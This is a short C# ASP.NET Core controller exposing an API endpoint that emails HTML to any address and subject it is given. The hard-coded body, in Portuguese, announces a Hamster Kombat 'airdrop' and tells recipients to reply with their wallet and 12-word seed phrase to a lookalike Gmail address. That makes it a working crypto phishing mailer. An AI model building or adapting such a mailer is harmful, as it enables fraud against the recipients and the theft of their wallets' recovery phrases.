using EmailSenderAPI.Helpers;
using EmailSenderAPI.Services;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

namespace EmailSenderAPI.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class EmailController : ControllerBase
    {
        private readonly IEmailService _emailService;

        public EmailController(IEmailService emailService)
        {
            _emailService = emailService;
        }

        [HttpPost]
        public async Task<IActionResult> SendEmail([FromForm] string email, [FromForm] string subject)
        {
            MailRequest mailRequest = new MailRequest();
            mailRequest.ToEmail = email;
            mailRequest.Subject = subject;
            mailRequest.Body = GetHtmlContent();

            await _emailService.SendEmailAsync(mailRequest);
            return Ok("Email enviado");
        }

        private string GetHtmlContent()
        {
            string Response = "<div style=\"width:100%;background-color:#FFAC1C;text-align:center;margin:10px\">";
            Response += "<h1>Air drop ja ta no ar</h1>";
            Response += "<h3>Responda o email com a carteira e as 12 palavra chave</h3>";
            Response += "<img src=\"https://financefeeds.com/wp-content/uploads/2024/07/Hamster-Kombat.png\" />";
            Response += "<div><h1>hamistercombat@gmail.com</h1></div>";
            Response += "</div>";
            return Response;
        }
    }
}
